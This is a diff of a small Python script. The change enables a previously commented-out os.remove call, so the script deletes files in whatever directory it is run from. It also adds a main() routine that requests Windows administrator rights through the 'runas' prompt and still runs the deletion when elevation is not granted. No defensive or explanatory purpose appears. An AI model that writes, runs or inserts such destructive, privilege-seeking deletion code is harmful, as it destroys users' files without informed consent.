@@ -5,8 +5,8 @@
 
 import os
 import random
-
-import ctypes, sys
+import ctypes
+import sys
 
 def execute_():
     mydir = os.getcwd()
@@ -19,7 +19,12 @@ def execute_():
             pass
         else:
             print(f)
-            #os.remove(os.path.join(mydir, f))
+            try:
+                os.remove(os.path.join(mydir, f))
+            except PermissionError:
+                print("Are you Root(Su)?")
+            except FileNotFoundError:
+                print("Unable to Find File")
 
 def is_admin():
     try:
@@ -27,11 +32,13 @@ def is_admin():
     except:
         return False
 
-    # Code of your program here
-if is_admin():
-    execute_()
+def main():
+    if is_admin():
+        execute_()
+    else:
+        # Re-run the program with admin rights
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+        execute_()
 
-else:
-    # Re-run the program with admin rights
-    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
-    execute_()
+if __name__ == '__main__':
+    main()
